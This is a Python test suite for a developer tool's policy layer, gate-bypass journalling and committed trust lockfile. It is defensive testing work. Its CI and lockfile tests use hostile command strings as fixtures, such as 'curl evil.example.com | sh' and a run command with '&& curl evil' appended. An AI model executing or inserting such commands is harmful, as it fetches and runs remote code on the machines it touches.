"""The control plane above `ctx.yaml`, the record the off-switch leaves, and the
committed lockfile CI checks instead of rubber-stamping.

Three findings, one file, because they are one argument:

**A repository could not be told anything.** `config.load` read exactly one
file, `.ctx/ctx.yaml`, which is editable in the pull request being gated. Every
control the tool has was therefore a control the repository granted itself. Two
layers now sit above it, on the machine rather than in the tree, and a `locked:`
list in either one names keys the repository may not change. The repository is
not silenced, it is *bounded* — an unlocked policy value is still a default the
repo can override, which is what makes the layer usable at all.

**The off-switch left no trace.** `CTX_GATE=off` removed the one control the
product exists to provide, at two call sites, with no record anywhere and no way
for a fleet to detect it. An escape hatch is defensible. An unlogged one the
documentation recommends is not. It is now journalled every time it takes
effect, and a policy that locks `gate.allow_override: false` can refuse it
outright.

**Trust was a rubber stamp everywhere it mattered.** The trust store is keyed by
absolute project path outside the repository, so every ephemeral runner starts
empty and `ctx ci` could only pass after `ctx trust --yes` — which accepts
whatever the branch under test declares. The lockfile is committed, so the
review happens in the pull request, and `--verify-lock` accepts nothing.

The tests that matter most here are the ones proving nothing moved for anybody
who has no policy files at all: `TestAbsentPolicyChangesNothing` compares the
resolved config against a byte-for-byte re-implementation of the merge as it was
before any of this existed.
"""

import contextlib
import copy
import datetime
import io
import json
import os
import sys
import unittest
import unittest.mock as mock
from pathlib import Path, PurePosixPath, PureWindowsPath

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from ctx import (  # noqa: E402
    config as config_mod, frontmatter, hooks, journal, miniyaml, state,
    trust as trust_mod,
)
from support import FAILS, OK, Fixture  # noqa: E402


def legacy_load(layout):
    """`config.load` exactly as it was before the policy layer existed.

    Kept as a literal copy rather than a call into the new code: the claim under
    test is "nothing changed for a machine with no policy files", and a
    re-implementation that shares code with the thing it checks cannot make that
    claim. If the two ever disagree, one of them is a regression for every
    existing user.
    """
    def merge(base, override):
        for key, value in override.items():
            if isinstance(value, dict) and isinstance(base.get(key), dict):
                merge(base[key], value)
            elif value is not None:
                base[key] = value

    data = copy.deepcopy(config_mod.DEFAULTS)
    path = layout.config
    if path.is_file():
        parsed = miniyaml.loads(path.read_text(encoding="utf-8")) or {}
        merge(data, parsed)
    data["level"] = config_mod.normalise_level(data.get("level"))
    return data


class PolicyFixture(Fixture):
    """A ledger with writable stand-ins for both machine-level policy files.

    The system layer is patched rather than written: its real home is
    `/etc/ctx/policy.yaml`, and a test suite that could write there would be
    describing a machine nobody should be running on.
    """

    def setUp(self):
        super().setUp()
        config_mod.reset_policy_warnings()
        self.policy_dir = self.untracked / "policy"
        self.policy_dir.mkdir(parents=True, exist_ok=True)
        self.system_policy = self.policy_dir / "system.yaml"
        patcher = mock.patch.object(
            config_mod, "system_policy_path", lambda: self.system_policy
        )
        patcher.start()
        self.addCleanup(patcher.stop)
        self.addCleanup(config_mod.reset_policy_warnings)

    def write_policy(self, layer, **settings):
        """Write one policy layer. `locked` may be a list or a mapping."""
        paths = {
            "system": self.system_policy,
            "system-env": self.policy_dir / "staged.yaml",
            "user": Path(os.environ["CTX_GLOBAL_ROOT"]) / "policy.yaml",
        }
        target = paths[layer]
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(miniyaml.dumps(settings) + "\n", encoding="utf-8")
        if layer == "system-env":
            os.environ["CTX_POLICY_SYSTEM"] = str(target)
        config_mod.reset_policy_warnings()
        return target

    def drop_repo_keys(self, *keys):
        """Remove keys from the generated `ctx.yaml`.

        `ctx init` renders *every* key in `DEFAULTS`, so a fresh ledger states
        an opinion on almost everything — and an unlocked policy value is by
        design overridable by exactly such an opinion. Dropping the key is how a
        test says "the repository has nothing to say about this".
        """
        parsed = miniyaml.loads(self.layout.config.read_text(encoding="utf-8")) or {}
        for key in keys:
            parsed.pop(key, None)
        self.layout.config.write_text(miniyaml.dumps(parsed) + "\n", encoding="utf-8")
        config_mod.reset_policy_warnings()

    def write_repo_config(self, **settings):
        merged = miniyaml.loads(self.layout.config.read_text(encoding="utf-8")) or {}
        merged.update(settings)
        self.layout.config.write_text(miniyaml.dumps(merged) + "\n", encoding="utf-8")
        config_mod.reset_policy_warnings()
        return self.layout.config

    def load(self):
        config_mod.reset_policy_warnings()
        err = io.StringIO()
        with mock.patch.object(sys, "stderr", err):
            config = config_mod.load(self.layout)
        return config, err.getvalue()

    def journal_text(self):
        path = self.layout.journal_file(journal.today())
        return path.read_text(encoding="utf-8") if path.is_file() else ""

    # -- the Stop hook, for real ------------------------------------------ #

    def arm_the_gate(self):
        """A task whose verify check fails, so the Stop hook has a verdict.

        Without one, `on_stop` returning `""` proves nothing: a gate that was
        bypassed and a gate that found no work to judge are indistinguishable.
        Armed, the two are opposites — a block or a clean exit.
        """
        self.assertEqual(self.cli("task", "gated")[0], 0)
        checks = [{"kind": "cmd", "run": FAILS}]
        trust_mod.accept(self.layout, checks)
        path = self.layout.task_file("gated")
        doc = frontmatter.read(path)
        doc.meta["verify"] = checks
        doc.body = (
            "## Objective\nDo the thing.\n\n## Acceptance criteria\n1. it works\n"
        )
        doc.write(path)
        config_mod.reset_policy_warnings()

    def stop(self, config=None):
        """Run the real Stop hook. A decision dict, or None for "carry on"."""
        if config is None:
            config, _err = self.load()
        return hooks.on_stop(self.layout, config, self.payload()) or None

    def rearm(self):
        """Forget the attempt counter between runs of an armed gate.

        The gate is bounded: it blocks `max_attempts` times and then escalates
        and stands down. A test that runs it four times is testing the bound,
        not the bypass, unless it resets between them.
        """
        state.clear_attempts(self.layout)


class TestPrecedence(PolicyFixture):
    """System, then user, then the repository — later wins where nothing is
    locked. That ordering is the whole point: an organisation states a default,
    an account adjusts it, a repository specialises it, and only a `locked:`
    entry stops the chain."""

    def test_a_user_policy_supplies_a_value_the_repo_never_mentions(self):
        self.drop_repo_keys("gate")
        self.write_policy("user", gate={"max_attempts": 9})
        config, _err = self.load()
        self.assertEqual(config["gate"]["max_attempts"], 9)
        self.assertEqual(
            config_mod.resolve_policy(self.layout).source_of("gate.max_attempts"),
            "user",
        )

    def test_the_user_layer_overrides_the_system_layer(self):
        self.drop_repo_keys("gate")
        self.write_policy("system", gate={"max_attempts": 7})
        self.write_policy("user", gate={"max_attempts": 9})
        config, _err = self.load()
        self.assertEqual(config["gate"]["max_attempts"], 9)

    def test_the_repo_overrides_a_policy_value_that_is_not_locked(self):
        """An unlocked policy value is a *default*, not a rule. Without this the
        layer would be unusable: every setting an organisation wanted to nudge
        would become one it had frozen."""
        self.write_policy("user", gate={"max_attempts": 9})
        self.write_repo_config(gate={"max_attempts": 2})
        config, err = self.load()
        self.assertEqual(config["gate"]["max_attempts"], 2)
        self.assertEqual(err, "", "an allowed override is not a complaint")

    def test_a_policy_merges_into_a_nested_block_rather_than_replacing_it(self):
        self.drop_repo_keys("briefing_chars")
        self.write_policy("user", briefing_chars={"l2": 1200})
        config, _err = self.load()
        self.assertEqual(config["briefing_chars"]["l2"], 1200)
        self.assertEqual(config["briefing_chars"]["l0"],
                         config_mod.DEFAULTS["briefing_chars"]["l0"])


class TestWhereThePolicyFilesLive(unittest.TestCase):
    """Criterion 1's file locations, asserted rather than left to a docstring:
    "which file do I edit" is the first question an administrator asks.

    POSIX `/etc/ctx/policy.yaml` and Windows `%PROGRAMDATA%\\ctx\\policy.yaml`
    are the conventional homes for machine-wide configuration on each platform,
    and both are administrator-owned by default — which is the point of putting
    the layer there. The user layer sits beside the trust store under the global
    root: both answer "what has this account agreed to", and neither may live in
    the repository that supplies the commands.
    """

    def test_the_system_layer_is_where_the_platform_keeps_machine_wide_config(self):
        # `Path` is swapped here for the same reason it is swapped below, in
        # the other direction. `config_mod.os` *is* the `os` module, so
        # patching `name` is a global mutation: pathlib then decides `Path`
        # means `PosixPath` and refuses to instantiate one on Windows. Without
        # this the test could only ever pass on the platform it ran on.
        with mock.patch.object(config_mod.os, "name", "posix"), \
                mock.patch.object(config_mod, "Path", PurePosixPath):
            self.assertEqual(config_mod.system_policy_path(),
                             PurePosixPath("/etc/ctx/policy.yaml"))
        # `Path` is swapped for its pure Windows flavour as well as `os.name`:
        # `pathlib.Path` refuses to instantiate a `WindowsPath` on POSIX, so
        # without this the test could only ever assert the platform it runs on.
        with mock.patch.object(config_mod.os, "name", "nt"), \
                mock.patch.object(config_mod, "Path", PureWindowsPath), \
                mock.patch.dict(os.environ, {"PROGRAMDATA": "D:\\ProgramData"}):
            self.assertEqual(config_mod.system_policy_path(),
                             PureWindowsPath("D:\\ProgramData\\ctx\\policy.yaml"))

    def test_the_user_layer_sits_beside_the_trust_store(self):
        with mock.patch.dict(os.environ, {"CTX_GLOBAL_ROOT": "/tmp/ctx-root"}):
            self.assertEqual(config_mod.user_policy_path(),
                             Path("/tmp/ctx-root/policy.yaml"))

    def test_the_repository_is_not_one_of_the_machine_layers(self):
        """Stated as a test because it is the whole design: a layer a pull
        request can edit cannot hold a control against that pull request."""
        for _source, path in config_mod.policy_layers():
            self.assertNotIn(".ctx", str(path))


class TestLocking(PolicyFixture):
    """A `locked:` key holds, and the repository's attempt to change it is
    visible. Silence here would be the whole failure: a repo whose setting did
    not apply, with nothing anywhere saying why."""

    def lock_the_gate(self, layer="user"):
        return self.write_policy(layer, gate={"enabled": True}, locked=["gate.enabled"])

    def test_a_locked_value_holds_against_the_repo(self):
        self.lock_the_gate()
        self.write_repo_config(gate={"enabled": False})
        config, _err = self.load()
        self.assertIs(config["gate"]["enabled"], True)

    def test_the_refusal_is_visible_on_stderr(self):
        self.lock_the_gate()
        self.write_repo_config(gate={"enabled": False})
        _config, err = self.load()
        self.assertIn("gate.enabled", err)
        self.assertIn("user policy locks it", err)
        self.assertIn("the locked value holds", err)

    def test_the_refusal_is_recorded_for_doctor_to_report(self):
        self.lock_the_gate()
        self.write_repo_config(gate={"enabled": False})
        refusals = config_mod.resolve_policy(self.layout).refusals
        self.assertEqual(len(refusals), 1)
        source, key, attempted, held, holder = refusals[0]
        self.assertEqual((source, key, attempted, held, holder),
                         ("repo", "gate.enabled", False, True, "user"))

    def test_doctor_names_the_refusal_and_counts_it_as_a_problem(self):
        self.lock_the_gate()
        self.write_repo_config(gate={"enabled": False})
        code, out = self.cli("doctor")
        self.assertIn("repo sets gate.enabled=False", out)
        self.assertIn("user policy locks it", out)
        self.assertEqual(code, 1, "a setting that cannot apply is a problem")

    def test_a_system_lock_cannot_be_relaxed_by_the_user_layer(self):
        """Locks bind *downward*, so the layer an administrator owns is the one
        that wins. A user policy that could unlock would put the control back in
        reach of whoever the control is for."""
        self.write_policy("system", gate={"max_attempts": 1},
                          locked=["gate.max_attempts"])
        self.write_policy("user", gate={"max_attempts": 99})
        config, err = self.load()
        self.assertEqual(config["gate"]["max_attempts"], 1)
        self.assertIn("system policy locks it", err)

    def test_an_env_staged_system_layer_cannot_unlock_the_fixed_one(self):
        """`CTX_POLICY_SYSTEM` stages an extra machine-wide file — additively.
        If it could replace the fixed path, one environment variable would void
        a root-owned policy, which is the unlogged off-switch again."""
        self.write_policy("system", gate={"enabled": True}, locked=["gate.enabled"])
        self.write_policy("system-env", gate={"enabled": False})
        config, _err = self.load()
        self.assertIs(config["gate"]["enabled"], True)

    def test_locking_a_parent_key_locks_everything_under_it(self):
        self.write_policy("user", gate={"max_attempts": 4}, locked=["gate"])
        self.write_repo_config(gate={"max_attempts": 11})
        config, _err = self.load()
        self.assertEqual(config["gate"]["max_attempts"], 4)

    def test_a_mapping_form_lock_sets_and_locks_in_one_place(self):
        self.write_policy("user", locked={"gate.max_attempts": 6})
        self.write_repo_config(gate={"max_attempts": 11})
        config, _err = self.load()
        self.assertEqual(config["gate"]["max_attempts"], 6)

    def test_restating_the_locked_value_is_not_an_override(self):
        self.write_policy("user", gate={"enabled": True}, locked=["gate.enabled"])
        self.write_repo_config(gate={"enabled": True})
        _config, err = self.load()
        self.assertEqual(err, "", "agreeing with a lock is not a violation")

    def test_a_repo_cannot_lock_its_own_settings(self):
        """`locked:` in `ctx.yaml` would be the repository granting itself the
        power the layer exists to take away."""
        self.write_repo_config(gate={"max_attempts": 8}, locked=["gate.max_attempts"])
        policy = config_mod.resolve_policy(self.layout)
        self.assertEqual(policy.locks, {})
        self.assertTrue(any("locked:` in ctx.yaml is ignored" in n
                            for n in policy.notes), policy.notes)

    def test_an_unreadable_policy_file_stops_the_command(self):
        """Every other optional file here fails soft. A control plane that
        cannot be read is a control silently not applied, so this one is loud."""
        self.system_policy.write_text("gate:\n\tenabled: true\n", encoding="utf-8")
        with self.assertRaises(SystemExit) as caught:
            config_mod.load(self.layout)
        self.assertIn("system policy", str(caught.exception))


class TestAbsentPolicyChangesNothing(PolicyFixture):
    """The criterion that keeps this from breaking every existing user.

    With no system and no user policy, the resolved config must equal what the
    pre-policy `config.load` produced, for a plain ledger and for a hand-edited
    one carrying nested blocks, lists and an explicit null.
    """

    def assert_same_as_before(self):
        self.assertFalse(config_mod.system_policy_path().exists())
        self.assertFalse(config_mod.user_policy_path().exists())
        self.assertNotIn("CTX_POLICY_SYSTEM", os.environ)
        config, err = self.load()
        self.assertEqual(config, legacy_load(self.layout))
        self.assertEqual(err, "")

    def test_a_freshly_initialised_ledger_resolves_identically(self):
        self.assert_same_as_before()

    def test_a_hand_edited_config_resolves_identically(self):
        self.write_repo_config(
            level="2",
            gate={"max_attempts": 5},
            briefing_chars={"l1": 400},
            redact=["token", "secret"],
            profile=None,
        )
        self.assert_same_as_before()

    def test_the_gate_is_untouched_when_no_policy_and_no_env_exist(self):
        config, _err = self.load()
        override = config_mod.gate_override(self.layout, config, "test")
        self.assertFalse(override.requested)
        self.assertFalse(override.disabled)
        self.assertNotIn("CTX_GATE", self.journal_text(),
                         "an override that never happened is not journalled")

    def test_doctor_still_passes_and_reports_no_policy(self):
        code, out = self.cli("doctor")
        self.assertEqual(code, 0, out)
        self.assertIn("no policy above the repository", out)


class TestDoctorExplainsTheSource(PolicyFixture):
    """`ctx doctor` answers "why is this setting what it is" without anyone
    opening three files in two directories."""

    def test_doctor_names_each_layer_and_whether_it_exists(self):
        code, out = self.cli("doctor")
        self.assertIn("## policy", out)
        self.assertIn("system", out)
        self.assertIn("user", out)
        self.assertIn("(absent)", out)
        self.assertEqual(code, 0, out)

    def test_doctor_attributes_an_active_setting_to_the_layer_that_set_it(self):
        self.write_policy("user", gate={"max_attempts": 9}, locked=["gate.max_attempts"])
        _code, out = self.cli("doctor")
        self.assertIn("gate.max_attempts = 9", out)
        self.assertIn("(from user, locked)", out)


class TestTheOffSwitchLeavesARecord(PolicyFixture):
    """`CTX_GATE=off` is journalled every time it takes effect, at both sites.

    The Stop hook was the second site and the one that mattered — it is where a
    session actually walks past the gate — and it used to spell the test out
    inline: its own `os.environ.get("CTX_GATE", "").lower() in (...)`, four
    spellings against the CLI's three, returning `""` with no record anywhere.
    `hooks.on_stop` now calls `config.gate_override(layout, config, "stop")` and
    obeys what comes back, so there is one definition of "off", one journal line
    per bypass, and one place a policy can refuse it.

    These tests drive `on_stop` itself rather than the shared decision it calls.
    That distinction is the whole point: the shared decision was already correct
    while the hook ignored it, and a test of the decision could not tell.
    """

    def setUp(self):
        super().setUp()
        os.environ["CTX_GATE"] = "off"

    def test_the_cli_site_journals_the_bypass(self):
        code, out = self.cli("doctor")
        self.assertIn("(CTX_GATE=off in this environment)", out)
        self.assertIn("doctor: gate disabled by CTX_GATE=off", self.journal_text())
        self.assertEqual(code, 0, out)

    def test_the_gate_is_armed_when_the_switch_is_not_thrown(self):
        """The control every test below depends on: with `CTX_GATE` unset this
        task blocks, so a `None` from `on_stop` is the bypass and nothing else."""
        self.arm_the_gate()
        os.environ.pop("CTX_GATE")
        decision = self.stop()
        self.assertIsNotNone(decision, "the armed gate must block on its own")
        self.assertEqual(decision["decision"], "block")

    def test_the_stop_hook_site_journals_the_bypass(self):
        self.arm_the_gate()
        self.assertIsNone(self.stop(), "the hook must obey the override")
        self.assertIn("stop: gate disabled by CTX_GATE=off", self.journal_text())

    def test_every_occurrence_is_recorded_not_just_the_first(self):
        self.arm_the_gate()
        for _ in range(3):
            self.assertIsNone(self.stop())
        self.assertEqual(self.journal_text().count("gate disabled by CTX_GATE"), 3)

    def test_every_spelling_of_off_is_one_decision(self):
        """The CLI honoured three spellings and the Stop hook four, so
        `CTX_GATE=disabled` switched the gate off while `ctx doctor` reported it
        as on. One tuple now, and asserted through the hook so that a site
        re-growing its own list of spellings is a failing test."""
        self.arm_the_gate()
        for value in ("off", "0", "false", "disabled", "OFF"):
            with self.subTest(value=value):
                os.environ["CTX_GATE"] = value
                self.rearm()
                self.assertIsNone(self.stop(), f"{value} must disable the gate")
        for value in ("", "on", "1", "true"):
            with self.subTest(value=value):
                os.environ["CTX_GATE"] = value
                self.rearm()
                decision = self.stop()
                self.assertIsNotNone(decision, f"{value} must leave the gate alone")
                self.assertEqual(decision["decision"], "block")

    def test_an_unset_variable_is_not_journalled_as_a_bypass(self):
        """A gate that ran is not an escape hatch, and a record of one bypass
        per Stop in every session would make the real ones unfindable."""
        self.arm_the_gate()
        os.environ.pop("CTX_GATE")
        self.stop()
        self.assertNotIn("CTX_GATE", self.journal_text())

    def test_a_bypass_the_journal_refuses_still_bypasses(self):
        """The audit record must not become a new way to break a session.

        `TestARecordThatCannotBeWritten` makes this point against the shared
        decision with a mocked `journal.append`; here it is the hook, against a
        journal directory the process genuinely cannot write. Whatever the
        journal does, `on_stop` returns the same verdict it would have returned
        with a working disk.
        """
        self.arm_the_gate()
        with_journal = self.stop()
        self.assertIsNone(with_journal)

        err = io.StringIO()
        with self.read_only_journal(), mock.patch.object(sys, "stderr", err):
            without_journal = self.stop()
        self.assertIsNone(without_journal, "the verdict must not depend on the log")
        self.assertIn("unrecorded", err.getvalue(), "and it must not go unnoticed")

    @contextlib.contextmanager
    def read_only_journal(self):
        """Make the journal genuinely unwritable, and writable again afterwards.

        Restored inside the test rather than by `addCleanup`, which unittest
        runs *after* `tearDown` — by which point the fixture has already tried
        to delete a directory it is not allowed to empty.
        """
        if os.name == "nt" or os.geteuid() == 0:
            self.skipTest("a read-only directory does not stop this process here")
        files = sorted(self.layout.journal.glob("*.md"))
        try:
            for path in files:
                path.chmod(0o444)
            self.layout.journal.chmod(0o555)
            yield
        finally:
            self.layout.journal.chmod(0o755)
            for path in files:
                path.chmod(0o644)


class TestPolicyCanRefuseTheOffSwitch(PolicyFixture):
    """A locked `gate.allow_override: false` refuses the bypass outright: the
    gate runs, and the refusal is recorded."""

    def setUp(self):
        super().setUp()
        self.write_policy("user", gate={"allow_override": False},
                          locked=["gate.allow_override"])
        os.environ["CTX_GATE"] = "off"

    def test_the_bypass_is_refused_and_the_gate_still_runs(self):
        config, _err = self.load()
        override = config_mod.gate_override(self.layout, config, "stop")
        self.assertFalse(override.disabled, "the gate must still run")
        self.assertTrue(override.refused)
        self.assertEqual(override.lock, "user")

    def test_the_refusal_is_journalled(self):
        config, _err = self.load()
        config_mod.gate_override(self.layout, config, "stop")
        self.assertIn("refused by user policy", self.journal_text())

    def test_the_stop_hook_obeys_the_refusal_and_gates_anyway(self):
        """The refusal is worth nothing unless the site that reads `CTX_GATE`
        honours it. Exactly the CLI's answer, from the hook: the gate runs."""
        self.arm_the_gate()
        decision = self.stop()
        self.assertIsNotNone(decision, "a refused bypass leaves the gate armed")
        self.assertEqual(decision["decision"], "block")
        self.assertIn("refused by user policy", self.journal_text())

    def test_doctor_reports_the_gate_as_still_enabled(self):
        code, out = self.cli("doctor")
        self.assertIn("enabled=True", out)
        self.assertIn("refused by user policy", out)
        self.assertEqual(code, 0, out)

    def test_the_repo_cannot_unlock_the_off_switch(self):
        self.write_repo_config(gate={"allow_override": True})
        config, err = self.load()
        self.assertIs(config["gate"]["allow_override"], False)
        self.assertIn("gate.allow_override", err)
        self.assertFalse(config_mod.gate_override(self.layout, config, "stop"))

    def test_an_unlocked_policy_leaves_the_repo_its_say(self):
        """Stated so the refusal above is understood as the *locked* case. A
        policy that merely prefers the gate un-bypassable has expressed a
        default, and a repository may still disagree with a default."""
        self.write_policy("user", gate={"allow_override": False})
        self.write_repo_config(gate={"allow_override": True})
        config, _err = self.load()
        self.assertTrue(config_mod.gate_override(self.layout, config, "stop"))


class TestARecordThatCannotBeWritten(PolicyFixture):
    """Criterion 7, the design tension: the audit record must not become a new
    way to break a session, and must not fail silently either.

    Resolution: the gate decision is made before the journal is touched and
    passed into the recorder, which cannot raise. A failed write therefore
    cannot change what the gate does — it downgrades the event from *recorded*
    to *reported*, on stderr and in `runtime/hook-errors.log`, which
    `ctx doctor` already reads.
    """

    def setUp(self):
        super().setUp()
        os.environ["CTX_GATE"] = "off"

    def override_with_stderr(self, config):
        err = io.StringIO()
        with mock.patch.object(sys, "stderr", err):
            override = config_mod.gate_override(self.layout, config, "stop")
        return override, err.getvalue()

    def test_a_raising_journal_does_not_change_the_gate(self):
        config, _err = self.load()
        with mock.patch.object(journal, "append", side_effect=OSError("disk full")):
            override, err = self.override_with_stderr(config)
        self.assertTrue(override.disabled, "the bypass still happened")
        self.assertFalse(override.recorded)
        self.assertIn("not journalled", err)

    def test_a_failed_write_lands_in_the_log_doctor_reads(self):
        config, _err = self.load()
        with mock.patch.object(journal, "append", side_effect=OSError("disk full")):
            self.override_with_stderr(config)
        self.assertTrue(self.layout.errors.is_file())
        self.assertIn("gate-override", self.layout.errors.read_text(encoding="utf-8"))
        _code, out = self.cli("doctor")
        self.assertIn("hook errors", out)

    def test_journalling_switched_off_is_still_reported(self):
        """`journal.append` returns None both when the write fails and when
        journalling is disabled in config. For this one event they mean the same
        thing — the audit trail does not have it — so both are reported."""
        self.write_repo_config(journal={"enabled": False})
        config, _err = self.load()
        override, err = self.override_with_stderr(config)
        self.assertTrue(override.disabled)
        self.assertFalse(override.recorded)
        self.assertIn("unrecorded", err)

    def test_doctor_flags_an_override_it_could_not_record(self):
        with mock.patch.object(journal, "append", side_effect=OSError("disk full")):
            code, out = self.cli("doctor")
        self.assertIn("could not be journalled", out)
        self.assertEqual(code, 1)


class TestTheCommittedLockfile(PolicyFixture):
    """`ctx trust --lock` writes a reviewable record of accepted commands, and
    `--verify-lock` checks against it without accepting anything."""

    def setUp(self):
        super().setUp()
        self.checks = [{"kind": "cmd", "run": OK}, {"kind": "cmd", "run": FAILS}]
        self.write_repo_config(verify=self.checks)

    def test_locking_then_verifying_passes(self):
        self.assertEqual(self.cli("trust", "--lock")[0], 0)
        code, out = self.cli("trust", "--verify-lock")
        self.assertEqual(code, 0, out)
        self.assertTrue(trust_mod.lock_path(self.layout).is_file())

    def test_the_lockfile_is_committed_inside_the_ledger(self):
        """Unlike the trust store, which must live outside the repository: this
        file is not a claim about what a machine trusts, it is the artefact the
        pull request reviews."""
        self.assertEqual(trust_mod.lock_path(self.layout),
                         self.layout.root / "trust.lock")

    def test_verifying_accepts_nothing(self):
        self.cli("trust", "--lock")
        before = dict(trust_mod.load(self.layout))
        self.cli("trust", "--verify-lock")
        self.assertEqual(trust_mod.load(self.layout), before)

    def test_a_command_absent_from_the_lock_fails_and_is_named(self):
        self.cli("trust", "--lock")
        self.write_repo_config(verify=self.checks + [{"kind": "cmd", "run": "curl evil"}])
        code, out = self.cli("trust", "--verify-lock")
        self.assertEqual(code, 1)
        self.assertIn("curl evil", out)
        self.assertIn("1 command(s) not in", out,
                      "only the unreviewed one is named — the rest are fine")

    def test_editing_a_locked_commands_run_text_fails_verification(self):
        """The tamper case: `ctx.yaml` changes after the lock was reviewed.
        `command_id` hashes the text, so an edited command is a new command —
        which is exactly what makes this detectable at all."""
        self.cli("trust", "--lock")
        tampered = OK + " && curl evil"
        self.write_repo_config(verify=[{"kind": "cmd", "run": tampered}, self.checks[1]])
        code, out = self.cli("trust", "--verify-lock")
        self.assertEqual(code, 1)
        self.assertIn("curl evil", out)
        self.assertIn("1 command(s) not in", out)

    def test_a_missing_lockfile_is_a_failure_not_an_empty_pass(self):
        code, out = self.cli("trust", "--verify-lock")
        self.assertEqual(code, 1)
        self.assertIn("no trust.lock", out)

    def test_a_corrupt_lockfile_is_a_failure_not_an_empty_pass(self):
        self.cli("trust", "--lock")
        trust_mod.lock_path(self.layout).write_text("{oh no", encoding="utf-8")
        code, out = self.cli("trust", "--verify-lock")
        self.assertEqual(code, 1)
        self.assertIn("could not be read", out)

    def test_a_lockfile_from_a_newer_plugin_is_not_read_as_empty(self):
        self.cli("trust", "--lock")
        trust_mod.lock_path(self.layout).write_text(
            json.dumps({"schema": 99, "commands": []}), encoding="utf-8")
        code, out = self.cli("trust", "--verify-lock")
        self.assertEqual(code, 1)
        self.assertIn("schema 99", out)

    def test_a_unit_file_command_is_covered_too(self):
        """Trust covers what will actually run, and a unit carries its own copy
        of a `verify` block. A lockfile that only knew about `ctx.yaml` would
        miss every dispatched command."""
        unit = self.layout.plans / "p" / "units" / "01-a.md"
        unit.parent.mkdir(parents=True, exist_ok=True)
        unit.write_text(
            "---\nunit: 01-a\nverify:\n  - kind: cmd\n    run: make check\n---\n\nbody\n",
            encoding="utf-8")
        self.cli("trust", "--lock")
        text = trust_mod.lock_path(self.layout).read_text(encoding="utf-8")
        self.assertIn("make check", text)


class TestTheLockfileIsReviewable(PolicyFixture):
    """Criterion 9. A file that reorders itself between runs is a file reviewers
    learn to skim, and a lockfile nobody reads is the rubber stamp again."""

    def test_order_of_declaration_does_not_change_the_bytes(self):
        checks = [{"kind": "cmd", "run": "b"}, {"kind": "cmd", "run": "a"},
                  {"kind": "cmd", "run": "c", "cwd": "sub"}]
        self.assertEqual(trust_mod.lock_render(checks),
                         trust_mod.lock_render(list(reversed(checks))))

    def test_writing_twice_produces_identical_bytes(self):
        self.write_repo_config(verify=[{"kind": "cmd", "run": OK}])
        self.cli("trust", "--lock")
        first = trust_mod.lock_path(self.layout).read_bytes()
        self.cli("trust", "--lock")
        self.assertEqual(first, trust_mod.lock_path(self.layout).read_bytes())

    def test_the_file_carries_no_timestamp_hostname_or_absolute_path(self):
        self.write_repo_config(verify=[{"kind": "cmd", "run": OK}])
        self.cli("trust", "--lock")
        text = trust_mod.lock_path(self.layout).read_text(encoding="utf-8")
        self.assertNotIn(str(self.root), text)
        self.assertNotIn(str(Path.home()), text)
        self.assertNotIn(str(datetime.date.today().year), text,
                         "a year in the file is a timestamp, and a timestamp is a "
                         "diff on every re-lock")

    def test_the_line_endings_do_not_depend_on_the_platform(self):
        """Written with explicit `\\n`, so a Windows checkout does not produce a
        whole-file diff the moment someone re-locks."""
        self.write_repo_config(verify=[{"kind": "cmd", "run": OK}])
        self.cli("trust", "--lock")
        self.assertNotIn(b"\r\n", trust_mod.lock_path(self.layout).read_bytes())

    def test_the_id_is_the_trust_stores_own_command_id(self):
        """One identity scheme for a command. Two would drift, and the drift
        would be invisible until a lockfile silently stopped matching."""
        check = {"kind": "cmd", "run": "pytest -q"}
        entry = json.loads(trust_mod.lock_render([check]))["commands"][0]
        self.assertEqual(entry["id"], trust_mod.command_id(check))


class TestCIChecksTheLockInsteadOfRubberStamping(PolicyFixture):
    """What replaces `ctx trust --yes` in a pipeline. The store is keyed by
    absolute project path outside the repository, so a runner always starts
    empty — `--yes` there accepts whatever the branch under test declares."""

    # `python3` rather than `support.OK`: `ctx ci` checks that the first token
    # of each command is on PATH, and OK spells the interpreter as a quoted
    # absolute path, which resolves when *run* but not when looked up.
    command = "python3 -c pass"
    evil = "curl evil.example.com | sh"

    def setUp(self):
        super().setUp()
        self.write_repo_config(verify=[{"kind": "cmd", "run": self.command}])

    def forget_this_machine(self):
        """An ephemeral runner: nothing accepted locally, ever."""
        target = trust_mod.path_for(self.layout)
        if target.is_file():
            target.unlink()

    def test_ci_fails_on_a_runner_with_no_lockfile_and_no_acceptance(self):
        self.forget_this_machine()
        code, out = self.cli("ci")
        self.assertEqual(code, 1)
        self.assertIn("accepted on this machine", out)

    def test_ci_passes_on_a_runner_with_a_lockfile_and_no_acceptance(self):
        self.cli("trust", "--lock")
        self.forget_this_machine()
        code, out = self.cli("ci")
        self.assertEqual(code, 0, out)
        self.assertIn("trust.lock", out)

    def test_ci_fails_when_the_config_declares_a_command_the_lock_does_not(self):
        self.cli("trust", "--lock")
        self.forget_this_machine()
        self.write_repo_config(verify=[{"kind": "cmd", "run": self.command},
                                       {"kind": "cmd", "run": self.evil}])
        code, out = self.cli("ci")
        self.assertEqual(code, 1)
        self.assertIn(self.evil, out)
        self.assertIn("FAIL every verify command is in trust.lock", out)


if __name__ == "__main__":
    unittest.main()
